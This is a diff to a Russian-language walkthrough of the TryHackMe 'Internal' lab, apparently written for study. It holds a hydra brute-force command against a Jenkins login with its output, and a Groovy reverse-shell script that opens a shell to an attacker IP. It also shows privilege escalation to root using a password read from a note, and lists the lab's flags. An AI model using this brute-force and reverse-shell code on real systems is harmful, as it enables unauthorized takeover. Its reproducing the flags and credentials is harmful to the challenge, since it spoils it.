@@ -303,14 +303,99 @@ aubreanna@internal.thm's password:
 Там встречает Jenkins
 ![jenkins](screenshots/04.jenkins.png)
 
+Выполняю brute force
+```
+┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - Internal/scans]
+└─$ hydra -l admin -P /media/sf_Exchange/Dictionaries/rockyou.txt -t 40 localhost -s 9999 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=Invalid username or password" -f    
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-10 02:02:45
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 40 tasks per 1 server, overall 40 tasks, 14344398 login tries (l:1/p:14344398), ~358610 tries per task
+[DATA] attacking http-post-form://localhost:9999/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=Invalid username or password
+[9999][http-post-form] host: localhost   login: admin   password: spongebob
+[STATUS] attack finished for localhost (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-10 02:03:12
+```
 
+Вхожу с кредами login: `admin`   password: `spongebob`
+Перехожу в панель скриптов `http://127.0.0.1:9999/script`
+и настраиваю reverse shell
+```
+String host="10.21.104.16";
+int port=5555;
+String cmd="bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
+OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+while(!s.isClosed()){
+  while(pi.available()>0)so.write(pi.read());
+  while(pe.available()>0)so.write(pe.read());
+  while(si.available()>0)po.write(si.read());
+  so.flush();
+  po.flush();
+  Thread.sleep(50);
+  try {
+    p.exitValue();break;
+  }catch (Exception e){}
+};
+p.destroy();
+s.close();
+```
+![script](screenshots/05.script.png)
+
+Получаю reverse shell и немного улучшаю его
+```
+┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - Internal/scans]
+└─$ nc -lvnp 5555
+listening on [any] 5555 ...
+connect to [10.21.104.16] from (UNKNOWN) [10.10.123.74] 35992
+id
+uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
+which python3
+which python
+/usr/bin/python
+python -c 'import pty;pty.spawn("/bin/bash")'
+jenkins@jenkins:/$
+```
+
+Скачиваю и запускаю linpeas
+```
+jenkins@jenkins:/tmp$ ./linpeas.sh
+./linpeas.sh
+```
+
+Находит файл с кредами
+![note](screenshots/06.note.png)
+```
+cat /opt/note.txt
+Aubreanna,
+
+Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
+need access to the root user account.
+
+root:tr0ub13guM!@#123
+jenkins@jenkins:/tmp$ 
+```
+
+Повышаю привилегии до root
+```
+aubreanna@internal:~$ su root
+Password:                                                                                                          
+root@internal:/home/aubreanna# id                                                                                  
+uid=0(root) gid=0(root) groups=0(root)                                                                             
+root@internal:/home/aubreanna# cd /root
+root@internal:~# cat root.txt
+THM{d0ck3r_d3str0y3r}
+root@internal:~# 
+```
 
 
 
 ## 🏁 Флаги
 
-- User flag: 
-- Root flag: 
+- User flag: THM{int3rna1_fl4g_1} 
+- Root flag: THM{d0ck3r_d3str0y3r} 
 
 ---
